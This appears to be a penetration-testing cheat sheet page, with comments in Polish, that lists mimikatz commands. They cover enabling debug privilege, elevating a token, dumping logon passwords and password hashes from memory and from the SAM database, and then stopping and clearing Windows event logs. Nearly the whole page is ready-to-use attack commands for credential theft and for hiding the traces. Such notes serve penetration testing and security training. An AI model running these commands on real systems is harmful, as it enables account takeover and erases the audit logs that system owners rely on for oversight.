---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# mimikatz

```python
mimikatz.exe
#tryb debugowania
privilege::debug

#podwyższenie uprawnień
token::elevate

#wylistowanie użytkowników i hashy
sekurlsa::logonpasswords

#załadowanie pliku z hashami wcześniej zdumpowanymi
sekurlsa::minidump plik.hashe

#dumpowanie pliku sam
lsadump::sam

#stworzenie logów
log

#zastopowanie generowania logów w Windowsie
event::drop

#wyczyszczenie EventViewer w Windows
event::clear
```
